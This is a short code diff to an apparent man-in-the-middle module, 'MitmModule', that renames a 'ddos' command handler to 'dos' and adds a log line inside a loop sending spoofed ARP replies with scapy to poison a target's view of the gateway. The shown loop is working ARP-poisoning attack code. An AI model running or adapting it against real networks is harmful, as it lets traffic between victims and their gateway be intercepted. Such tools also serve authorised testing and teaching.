@@ -46,7 +46,7 @@ class MitmModule(BaseModule):
         # Register command handlers
         self.register_handler("poison_all", self.handle_poison_all)
         self.register_handler("poison_selected", self.handle_poison_selected)
-        self.register_handler("ddos", self.handle_get_status)
+        self.register_handler("dos", self.handle_get_status)
         self.register_handler("passthrough", self.handle_passthrough)
         self.register_handler("restore", self.handle_restore)
         self.register_handler("get_status", self.handle_get_status)
@@ -174,6 +174,7 @@ class MitmModule(BaseModule):
             while True:
                 arp_response = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.self_mac)
                 scapy.send(arp_response, verbose=False)
+                print("Sent ARP response")
             
         except Exception as e:
             self.send_event("attack_error", {"error": str(e)})
